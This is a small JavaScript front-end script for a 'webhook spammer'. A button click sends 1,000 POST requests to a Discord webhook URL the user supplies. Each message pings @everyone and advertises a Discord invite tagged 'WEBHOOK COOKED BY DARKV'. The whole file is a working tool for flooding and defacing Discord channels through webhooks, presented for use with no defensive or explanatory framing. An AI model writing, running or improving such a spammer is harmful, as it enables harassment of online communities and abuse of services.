const spamButton = document.getElementById('spamButton');
const statusText = document.getElementById('status');
const webhookUrlInput = document.getElementById('webhookUrl');
const loader = document.getElementById('loader');

spamButton.addEventListener('click', async () => {
    const webhookUrl = webhookUrlInput.value.trim();
    const message = "😈🤦‍♂️WEBHOOK COOKED BY DARKV @everyone https://discord.gg/dpRvmbRZUK 🤦‍♂️😈";

    if (!webhookUrl) {
        statusText.textContent = "Status: Error... Invalid Webhook URL";
        return;
    }

    statusText.textContent = "Status: Sending messages...";
    loader.style.display = 'block';  // Show loader

    try {
        for (let i = 0; i < 1000; i++) {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        }
        statusText.textContent = "Status: Messages sent successfully!";
    } catch (error) {
        console.error(error);
        statusText.textContent = "Status: Error... Failed to send messages";
    } finally {
        loader.style.display = 'none';  // Hide loader after completion
    }
});
